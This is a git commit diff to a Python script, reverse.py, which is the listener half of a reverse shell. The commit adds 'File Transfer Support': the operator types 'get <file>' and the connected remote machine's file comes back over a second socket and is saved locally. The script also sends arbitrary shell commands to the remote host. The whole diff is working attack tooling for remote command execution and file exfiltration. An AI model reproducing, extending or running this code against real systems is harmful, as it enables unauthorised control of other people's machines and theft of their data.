84752043986151713844b001e0e427ab16177e9f
Ishan Dhingra <Ishan.Dhingra@snapdeal.com>
2016-12-28 15:38:49 +0530

    File Transfer Support

--- reverse.py
+++ reverse.py
@@ -3,7 +3,7 @@ import sys
 
 s = socket.socket()
 # Your Host IP
-host = "192.168.1.15"
+host = "192.168.1.2"
 # Any port; using 443 because open in every network
 port = 443
 buffSize = 1024
@@ -17,20 +17,47 @@ print ("Shot Commands!")
 run = True
 while run:
     try:
-        cmd = str(raw_input(">"))
+        cmd = str(raw_input(str(addr)+">"))
         if cmd == "\n" or cmd is not None:
             c.send(cmd+'\n')
         else:
             continue
-        response = c.recv(buffSize).strip().decode("utf-8")
-        keepReading = True
-        while keepReading:
-            keepReading = '$endRes$' not in response
-            if not keepReading:
-                response = response.replace("$endRes$","")
-            print (response)
-            if keepReading:
+        isFileReq = cmd.startswith("get ")
+        response = ""
+        if not isFileReq:
+            response = c.recv(buffSize).strip().decode("utf-8")
+            keepReading = True
+            while keepReading:
+                keepReading = '$endRes$' not in response
+                if not keepReading:
+                    response = response.replace("$endRes$","")
+                print (response)
+                if keepReading:
+                    response = c.recv(buffSize).strip().decode("utf-8")
+        else:
+            fileName = cmd.split(" ")[1]
+            if fileName is not None and fileName != "":
+                savePath = "/"+fileName
+                file = open(savePath, "w")
+                print ("Receiving file at ", savePath)
+                print ("Establising Data Socket")
+                dataSock, addr = s.accept()
+                print ("Data Socket Establised")
+                dataSock.settimeout(2.0)
+                chunk = dataSock.recv(buffSize)
+                rc = 0
+                print("Receiving File...")
+                while chunk:
+                    file.write(chunk)
+                    rc += len(chunk)
+                    chunk = dataSock.recv(buffSize)
+                file.close()
+                dataSock.close()
+                print ("Bytes Received: ", rc,)
+                print ("File Received at ", savePath)
+                # Just to consume the last end message
                 response = c.recv(buffSize).strip().decode("utf-8")
+            
         if response == "bye":
             run = False
             c.close()
